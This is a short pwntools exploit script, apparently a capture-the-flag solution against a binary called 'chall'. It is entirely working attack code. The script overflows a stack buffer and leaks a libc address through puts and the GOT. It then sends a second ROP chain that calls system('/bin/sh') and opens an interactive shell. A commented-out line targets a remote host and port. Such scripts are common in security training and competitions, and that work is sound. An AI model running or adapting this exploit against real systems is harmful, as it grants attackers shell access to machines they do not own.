from pwn import *

binary = './chall'
elf = ELF(binary)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = process(binary)
# libc = ELF('./libc.so.6')
# p = remote('34.143.130.87', 4097)

offset = 0x2c
pop_rdi = 0x0000000000401523

payload = b'a'*offset
payload += p32(1)
payload += b'a'*8

payload += p64(pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.sym['puts'])
payload += p64(elf.sym['main'])

p.recv()
p.sendline(payload)

p.recv()
p.sendline(b'1')

libc.address = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - libc.sym['puts']
print(hex(libc.address))

system = libc.sym['system']
bin_sh = next(libc.search(b'/bin/sh'))

payload = b'a'*offset
payload += p32(1)
payload += b'a'*8
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(pop_rdi + 1)
payload += p64(system)

p.recv()
p.sendline(payload)

p.recv()
p.sendline(b'1')

p.interactive()